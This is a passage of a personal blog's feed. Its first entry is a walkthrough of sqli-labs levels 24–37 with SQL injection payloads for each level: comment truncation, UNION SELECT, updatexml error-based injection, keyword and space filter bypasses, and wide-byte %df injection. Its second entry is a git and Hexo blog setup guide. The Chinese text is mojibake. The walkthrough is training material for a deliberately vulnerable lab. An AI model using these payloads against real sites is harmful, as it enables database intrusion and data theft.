class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; </span><br></pre></td></tr></table></figure><p>é€šè¿‡å¸¦æœ‰æ³¨é‡Šç¬¦çš„ç”¨æˆ·åå˜ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39; -- - &#39; and password&#x3D;&#39;$curr_pass&#39; </span><br></pre></td></tr></table></figure><p>äºæ˜¯åé¢çš„passwordè®¤è¯å°±è¢«æ³¨é‡Šæ‰äº†<br>æœ€åå°±å˜æˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure><h1 id="Less-25-ç¦æ­¢andå’Œorçš„æ³¨å…¥"><a href="#Less-25-ç¦æ­¢andå’Œorçš„æ³¨å…¥" class="headerlink" title="Less-25-ç¦æ­¢andå’Œorçš„æ³¨å…¥"></a>Less-25-ç¦æ­¢andå’Œorçš„æ³¨å…¥</h1><p>è¿™å…³è¿›æ¥åå¾—åˆ°æç¤ºï¼Œæˆ‘ä»¬çš„and å’Œ or éƒ½è¢«ç¦æ­¢äº†ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘ä½¿ç”¨è”åˆæ³¨å…¥<br>è¿™é‡Œæ˜¯payload</p><blockquote><p>id=-1â€™ union select 1,2,3 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210214141956339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70" alt="="></p><h1 id="Less-25a-ç¦æ­¢andå’Œorçš„æ³¨å…¥"><a href="#Less-25a-ç¦æ­¢andå’Œorçš„æ³¨å…¥" class="headerlink" title="Less-25a-ç¦æ­¢andå’Œorçš„æ³¨å…¥"></a>Less-25a-ç¦æ­¢andå’Œorçš„æ³¨å…¥</h1><p>è¿™å…³è·Ÿä¸Šä¸€å…³ä¸€æ ·ï¼Œä½†æ˜¯æ³¨å…¥ç‚¹æ”¹ä¸ºäº†æ— é™åˆ¶æ³¨å…¥<br>è¿™é‡Œæ˜¯payload</p><blockquote><p>id=-1 union select 1,2,3 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210214142247503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-26-è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„æ³¨å…¥"><a href="#Less-26-è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„æ³¨å…¥" class="headerlink" title="Less-26-è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„æ³¨å…¥"></a>Less-26-è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„æ³¨å…¥</h1><p>è¿™å…³æŠŠç©ºæ ¼å’Œæ³¨é‡Šè¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä½¿ç”¨å•å¼•å·é—­åˆåé¢çš„å•å¼•å·<br>ç”±äºè¿‡æ»¤andå’Œorçš„æœºåˆ¶æ˜¯and = â€œâ€<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·å­ç»•è¿‡æ»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aandnd</span><br></pre></td></tr></table></figure><p>å½“é‡Œé¢çš„andè¢«è¿‡æ»¤æˆç©ºäº†ä¹‹åï¼Œä¸¤è¾¹åˆåœ¨ä¸€èµ·å°±å˜æˆäº†ä¸€ä¸ªæ–°çš„and<br>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;aandnd(updatexml(1,concat(0x7e,database(),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210214151612998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-27-è¿‡æ»¤äº†unionå’Œselectçš„æ³¨å…¥"><a href="#Less-27-è¿‡æ»¤äº†unionå’Œselectçš„æ³¨å…¥" class="headerlink" title="Less-27-è¿‡æ»¤äº†unionå’Œselectçš„æ³¨å…¥"></a>Less-27-è¿‡æ»¤äº†unionå’Œselectçš„æ³¨å…¥</h1><p>è¿™å…³æŠŠunionå’Œselectè¿‡æ»¤æ‰äº†ï¼Œä½†æ²¡å•¥äº‹ï¼Œæˆ‘ä»¬å‰å‡ å…³éƒ½åœ¨ç”¨æŠ¥é”™æ³¨å…¥ï¼Œæ‰€ä»¥è¿™ä¸€å…³ä¹Ÿä¸€æ ·<br>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;and(updatexml(1,concat(0x7e,database(),0x7e),1))and&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210214155612387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-28-è¿‡æ»¤äº†unionå’Œselectçš„æ³¨å…¥ï¼Œä¸”æŠ¥é”™æ³¨å…¥ä¸å¯ç”¨"><a href="#Less-28-è¿‡æ»¤äº†unionå’Œselectçš„æ³¨å…¥ï¼Œä¸”æŠ¥é”™æ³¨å…¥ä¸å¯ç”¨" class="headerlink" title="Less-28-è¿‡æ»¤äº†unionå’Œselectçš„æ³¨å…¥ï¼Œä¸”æŠ¥é”™æ³¨å…¥ä¸å¯ç”¨"></a>Less-28-è¿‡æ»¤äº†unionå’Œselectçš„æ³¨å…¥ï¼Œä¸”æŠ¥é”™æ³¨å…¥ä¸å¯ç”¨</h1><p>è¿™å…³æ˜¯è¿‡æ»¤äº†unionå’Œselectçš„æ³¨å…¥ï¼Œæ‰€ä»¥è¿›æ¥ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº†æŠ¥é”™ï¼Œç»“æœå‘ç°æŠ¥é”™ä¸å¯ç”¨ï¼Œå› ä¸ºæŠ¥é”™ç‚¹è¢«æ³¨é‡Šæ‰äº†ï¼ŒæŸ¥äº†æŸ¥å‘ç°å¯ä»¥ç”¨è½¬ç¼–ç <br>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç¼–ç å‰</span><br><span class="line">-1&#39;) UnIon All Select (&#39;1&#39;),2,(&#39;3</span><br><span class="line">ç¼–ç å</span><br><span class="line">999%27)%0AUnIon%0AAll%0ASelect%0A(%271%27),2,(%273</span><br><span class="line">tipsï¼š%0Aæ˜¯æ¢è¡Œç¬¦</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210216140251280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-29-åŸºäºâ€™-çš„å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-29-åŸºäºâ€™-çš„å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-29-åŸºäºâ€™ çš„å­—ç¬¦å‹æ³¨å…¥"></a>Less-29-åŸºäºâ€™ çš„å­—ç¬¦å‹æ³¨å…¥</h1><p>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/202102161406411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-30-åŸºäºâ€-çš„å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-30-åŸºäºâ€-çš„å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-30-åŸºäºâ€ çš„å­—ç¬¦å‹æ³¨å…¥"></a>Less-30-åŸºäºâ€ çš„å­—ç¬¦å‹æ³¨å…¥</h1><p>è¿™å…³è·Ÿä¸Šä¸€å…³ä¸€æ ·ï¼Œä½†æ˜¯å˜æˆäº†â€<br>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3%23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021021614155615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-31-åŸºäºâ€-çš„å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-31-åŸºäºâ€-çš„å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-31-åŸºäºâ€) çš„å­—ç¬¦å‹æ³¨å…¥"></a>Less-31-åŸºäºâ€) çš„å­—ç¬¦å‹æ³¨å…¥</h1><p>è¿™å…³ä¹Ÿæ²¡è¿‡æ»¤å•¥<br>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999&quot;) union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210217161755650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-32-åŸºäºâ€™-çš„å®½å­—èŠ‚æ³¨å…¥"><a href="#Less-32-åŸºäºâ€™-çš„å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="Less-32-åŸºäºâ€™ çš„å®½å­—èŠ‚æ³¨å…¥"></a>Less-32-åŸºäºâ€™ çš„å®½å­—èŠ‚æ³¨å…¥</h1><p>è¿™å…³ç”¨åæ–œæ  / æŠŠâ€™ å’Œ â€œ è½¬ä¹‰æ‰äº†ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨çš„è¯æ˜¯ä¸èƒ½é—­åˆçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¯•ä¸€ä¸‹å®½å­—èŠ‚æ³¨å…¥<br>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999%df&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210218141253620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h1><p>è¿™å…³è·Ÿä¸Šä¸€å…³ä¸€æ ·ï¼Œåªä¸è¿‡æ˜¯ç”¨äº†phpå†…çš„å‡½æ•°æ¥è¿›è¡Œåæ–œæ è½¬ä¹‰ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999%df&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210218141554168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-34-POSTæ–¹å¼çš„å®½å­—èŠ‚æ³¨å…¥"><a href="#Less-34-POSTæ–¹å¼çš„å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="Less-34-POSTæ–¹å¼çš„å®½å­—èŠ‚æ³¨å…¥"></a>Less-34-POSTæ–¹å¼çš„å®½å­—èŠ‚æ³¨å…¥</h1><p>è¿™å…³ä¹Ÿæ˜¯å®½å­—èŠ‚æ³¨å…¥ï¼Œä½†æ˜¯æ³¨å…¥æ–¹å¼å˜ä¸ºäº†POSTå‹æ³¨å…¥<br>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1ï¿½&#39; union select 1,2 -- </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021021819393675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-35-æ•°å€¼å‹æ³¨å…¥"><a href="#Less-35-æ•°å€¼å‹æ³¨å…¥" class="headerlink" title="Less-35-æ•°å€¼å‹æ³¨å…¥"></a>Less-35-æ•°å€¼å‹æ³¨å…¥</h1><p>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999 union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210218194057972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-36-åŸºäºâ€™-çš„å®½å­—èŠ‚æ³¨å…¥"><a href="#Less-36-åŸºäºâ€™-çš„å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="Less-36-åŸºäºâ€™ çš„å®½å­—èŠ‚æ³¨å…¥"></a>Less-36-åŸºäºâ€™ çš„å®½å­—èŠ‚æ³¨å…¥</h1><p>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;999%df&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210218194250953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-37-åŸºäºPOSTå‹çš„å®½å­—èŠ‚æ³¨å…¥"><a href="#Less-37-åŸºäºPOSTå‹çš„å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="Less-37-åŸºäºPOSTå‹çš„å®½å­—èŠ‚æ³¨å…¥"></a>Less-37-åŸºäºPOSTå‹çš„å®½å­—èŠ‚æ³¨å…¥</h1><p>è¿™é‡Œæ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">999ï¿½&#39; union select 1,2 -- </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210218194420881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;sql-labs-less-1-10&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://lucifer-rossweisse.github.io/categories/Web/"/>
    
    
    <category term="sql" scheme="https://lucifer-rossweisse.github.io/tags/sql/"/>
    
    <category term="sql-labs" scheme="https://lucifer-rossweisse.github.io/tags/sql-labs/"/>
    
  </entry>
  
  <entry>
    <title>github+hexoæ­å»ºä¸ªäººåšå®¢æ•™ç¨‹</title>
    <link href="https://lucifer-rossweisse.github.io/2021/01/12/github+hexo%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"/>
    <id>https://lucifer-rossweisse.github.io/2021/01/12/github+hexo%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</id>
    <published>2021-01-12T14:58:31.000Z</published>
    <updated>2021-02-06T01:57:36.402Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ­å»ºæ­¥éª¤"><a href="#æ­å»ºæ­¥éª¤" class="headerlink" title="æ­å»ºæ­¥éª¤"></a>æ­å»ºæ­¥éª¤</h1><ul><li>ç¯å¢ƒæ­å»º<ul><li>å®‰è£…node.js</li><li>å®‰è£…git</li><li>å®‰è£…Hexo</li></ul></li><li>githubä»“åº“çš„åˆ›å»º</li><li>githubSSHçš„é…ç½®</li><li>sublimeçš„å®‰è£…ä½¿ç”¨</li><li>Hexoä¸githubè¿æ¥</li><li>Hexoçš„ä¸»é¢˜åˆ‡æ¢<a id="more"></a><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><h2 id="å®‰è£…node-js"><a href="#å®‰è£…node-js" class="headerlink" title="å®‰è£…node.js"></a>å®‰è£…node.js</h2></li><li>å®‰è£…node.jsä¹‹å‰è¯·å…ˆå®‰è£…npmå¹¶äº†è§£ç›¸å…³çŸ¥è¯†</li></ul><p>HexoåŸºäºnode.js,æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç°åœ¨è®¡ç®—æœºä¸­å®‰è£…<a href="https://nodejs.org/zh-cn/download/">node.js</a>.<br><img src="https://img-blog.csdnimg.cn/20210111144246737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">é€‰æ‹©windows64ä½å®‰è£…åŒ…ä¸‹è½½ï¼Œä¸‹è½½å®Œåä¸€è·¯nextå°±å¥½å•¦ã€‚</p><p>æ£€æŸ¥node.jsæ˜¯å¦å®‰è£…æˆåŠŸï¼Œwin+ræ‰“å¼€å‘½ä»¤çª—å£ï¼Œè¾“å…¥node -v<br><img src="https://img-blog.csdnimg.cn/20210112111604710.png" alt="node.js æ£€æµ‹"><br>å‡ºç°ç‰ˆæœ¬å·å³å®‰è£…æˆåŠŸ</p><p>æ£€æŸ¥npmæ˜¯å¦å®‰è£…æˆåŠŸï¼Œåœ¨å‘½ä»¤çª—å£ä¸‹ï¼Œè¾“å…¥npm -v<br><img src="https://img-blog.csdnimg.cn/20210112111804857.png" alt="npm æ£€æµ‹"><br>å‡ºç°ç‰ˆæœ¬å·å³å®‰è£…æˆåŠŸ</p><p>å¥½å•¦ï¼Œåˆ°è¿™é‡ŒHexoçš„ç¯å¢ƒå·²ç»æ­å»ºå®Œæ¯•äº†</p><h2 id="å®‰è£…git"><a href="#å®‰è£…git" class="headerlink" title="å®‰è£…git"></a>å®‰è£…git</h2><h3 id="1ã€gitä¸‹è½½"><a href="#1ã€gitä¸‹è½½" class="headerlink" title="1ã€gitä¸‹è½½"></a>1ã€gitä¸‹è½½</h3><p>gitçš„ä¸‹è½½å¯ä»¥å»å®˜ç½‘ä¸‹è½½<a href="https://www.git-scm.com/download%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BC%9A%E6%9C%89%E7%82%B9%E6%85%A2%E3%80%82">https://www.git-scm.com/downloadï¼Œä½†æ˜¯ä¼šæœ‰ç‚¹æ…¢ã€‚</a><br>è§‰å¾—æ…¢çš„å¯ä»¥å»è¿™ä¸ªç½‘å€ä¸‹è½½é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw">https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw</a> æå–ç ï¼šqivu </p><h3 id="2ã€gitå®‰è£…"><a href="#2ã€gitå®‰è£…" class="headerlink" title="2ã€gitå®‰è£…"></a>2ã€gitå®‰è£…</h3><p>1ã€ä¸‹è½½å®ŒååŒå‡»å®‰è£…ç¨‹åºGit-2.30.0-64-bitï¼Œè¿›å…¥å®‰è£…ç•Œé¢ï¼Œç‚¹å‡»nextï¼š<br><img src="https://img-blog.csdnimg.cn/2021011216423378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2ã€é€‰æ‹©å®‰è£…ç›®å½•ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112164344294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3ã€å®‰è£…é…ç½®çª—å£ï¼ŒåŒ…æ‹¬gitå‘½ä»¤è¡Œã€gitå›¾å½¢ç•Œé¢ç­‰ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112164432241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4ã€é€‰æ‹©å¼€å§‹èœå•æ–‡ä»¶ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112164543529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>5ã€é€‰æ‹©gitçš„é»˜è®¤ç¼–è¯‘å™¨ï¼Œæ¨èvimï¼š<br><img src="https://img-blog.csdnimg.cn/20210112164710774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>6ã€é€‰æ‹©ä»“åº“çš„åˆå§‹åç§°ï¼Œé€‰é»˜è®¤å°±å¥½äº†ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112164917618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>7ã€é€‰æ‹©å¯ä»¥ç”¨windowså‘½ä»¤è¡Œæ“ä½œï¼Œä¹Ÿå¯ç”¨git bashæ“ä½œï¼š<br><img src="https://img-blog.csdnimg.cn/20210112165043808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>8ã€HTTPSä¼ è¾“åå°ï¼Œç”¨é»˜è®¤çš„å°±è¡Œäº†ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112165228493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>9ã€é€‰æ‹©æ¢è¡Œç¬¦ï¼Œé»˜è®¤unixæ ¼å¼ï¼Œå¦‚æœæ£€æµ‹åˆ°windowsæ ¼å¼åˆ™è‡ªåŠ¨è½¬æ¢ä¸ºunixæ ¼å¼ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112165331786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>10ã€é€‰æ‹©é…ç½®é»˜è®¤ç»ˆç«¯ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112165500295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>11ã€é€‰æ‹©git pullé£æ ¼ï¼Œæ¨èé»˜è®¤ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112165533960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>12ã€é€‰æ‹©å‡­æ®ç®¡ç†ï¼Œæ¨èé»˜è®¤é€‰é¡¹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112165642464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>13ã€é…ç½®é¢å¤–çš„é€‰é¡¹ï¼Œé€‰æ‹©æ–‡ä»¶ç¼“å­˜ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112165731109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>14ã€è¿™æ˜¯æ–°åŠŸèƒ½ï¼Œä¸æ¨èé€‰æ‹©ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112165808234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>15ã€å®‰è£…ä¸­ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112165840223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>16ã€å®‰è£…æˆåŠŸè¾£ï¼š<br><img src="https://img-blog.csdnimg.cn/20210112165902939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>17ã€åœ¨ä»»æ„æ–‡ä»¶å¤¹ä¸­ï¼Œå³é”®å³å¯é€‰æ‹©<br>Git GUIä¸ºgitå›¾å½¢ç•Œé¢å·¥å…·<br>Git Bashä¸ºå‘½ä»¤è¡Œå·¥å…·<br><img src="https://img-blog.csdnimg.cn/20210112170126809.png"></p><h2 id="Hexoå®‰è£…"><a href="#Hexoå®‰è£…" class="headerlink" title="Hexoå®‰è£…"></a>Hexoå®‰è£…</h2><h3 id="Hexoå®‰è£…-1"><a href="#Hexoå®‰è£…-1" class="headerlink" title="Hexoå®‰è£…"></a>Hexoå®‰è£…</h3><p>hexoæ˜¯æˆ‘ä»¬ä»¥åç”¨äºæ­å»ºä¸ªäººåšå®¢çš„æ¡†æ¶ï¼Œæ‰€ä»¥æœ€å¥½å…ˆæ–°å»ºä¸€ä¸ªblogæ–‡ä»¶å¤¹ç”¨äºåšå®¢çš„ç®¡ç†ï¼Œä¸”hexoæ¡†æ¶ä¸ä»¥åå†™ä½œå‘å¸ƒçš„ç½‘é¡µéƒ½ä¼šä¿å­˜åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹å½“ä¸­ã€‚<br>åˆ›å»ºå¥½ä¹‹åï¼Œæ‰“å¼€å‘½ä»¤è¡Œï¼Œåˆ‡æ¢è‡³åˆ›å»ºçš„æ–‡ä»¶å¤¹ä¸­ï¼š<br><img 